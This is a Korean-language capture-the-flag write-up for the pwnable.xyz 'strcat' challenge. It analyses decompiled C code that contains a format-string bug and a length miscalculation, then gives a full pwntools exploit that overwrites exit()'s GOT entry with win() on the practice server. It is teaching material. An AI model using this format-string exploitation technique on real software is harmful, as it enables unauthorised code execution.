# [pwnable.xyz] strcat

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Who needs a name extending service? That's probably vulnerable.
>
> Release: [strcat.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8965751/strcat.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/175262408-b3c8394d-6a6d-4388-ab02-9ad6c879aad6.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `readline()`

```c
__int64 __fastcall readline(void *buf, int len)
{
  int nameLen; // eax

  read(0, buf, len);
  nameLen = strlen(name);
  *((_BYTE *)buf + nameLen - 1) = 0;
  return (unsigned int)(nameLen - 1);
}
```

`buf`에 `len`만큼 문자열을 입력받는다. 그런데 `strlen(buf)`가 아니라 `strlen(name)`으로 길이를 계산하고 그 위치에 `0x00`을 넣는다.

### `main()`

```c
  maxlen = 0x80;
  printf("Name: ");
  maxlen -= readline(name, 0x80);
  desc = (char *)malloc(0x20uLL);
  printf("Desc: ");
  readline(desc, 0x20);
```

`name`과 `desc`는 둘 다 전역 변수인데, `name`은 문자열을 직접 저장하는 `0x80`바이트 크기의 배열이고, `desc`는 문자열이 저장된 메모리의 주소를 저장한다.

#### 1. Concat to name

```c
      case 1:
        printf("Name: ");
        v4 = maxlen;
        spareLen = v4 - (unsigned int)strlen(name);
        concatAddr = &name[strlen(name)];
        maxlen -= readline(concatAddr, spareLen);
        break;
```

`name`에 몇 바이트나 더 입력할 수 있는지 계산해서, `name`의 끝 부분부터 남은 길이만큼 입력을 받는다.

#### 2. Edit description

```c
      case 2:
        printf("Desc: ");
        readline(desc, 0x20);
        break;
```

`desc`에 저장된 주소의 메모리에 새로 `0x20`바이트만큼 문자열을 입력받는다.

#### 3. Print it all

```c
      case 3:
        printf(name);
        printf(desc);
        putchar('\n');
        break;
```

`name`과 `desc`를 `printf()`의 포맷 스트링으로 전달해서 출력한다.

## Exploit

`3. Print it all`에서 발생하는 double stage FSB로 AAW가 가능하다.

![image](https://user-images.githubusercontent.com/104156058/175477499-ecca1a79-d049-47ad-9287-6f3e23463367.png)

`rsp`에는 `rsp+0xf0`이 저장되어 있는데, `printf(name)`에서 `rsp+0xf0`에 `exit()`의 GOT 주소를 쓰고, `printf(desc)`에서 `exit()`의 GOT에 `win()`의 주소를 쓴다. 그리고 서버 접속 후 60초가 경과하면 `handler()`가 실행되고 내부에서 `exit()`을 호출하므로, 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30013)

sla = r.sendlineafter
sa = r.sendafter

win = 0x40094c
exit_got = 0x602078

sa('Name: ', '%' + str(exit_got) + 'c%6$n' + 'AAAAAAAAAAAA\n')
sa('Desc: ', '%' + str(win) + 'c%36$n')

sla('> ', '3')

r.recvlines(2)

# wait 60 seconds

r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30013: Done
[*] Switching to interactive mode
1. Concat to name.
2. Edit description.
3. Print it all.
> FLAG{if_u_used_the_fsb_u_failed}
```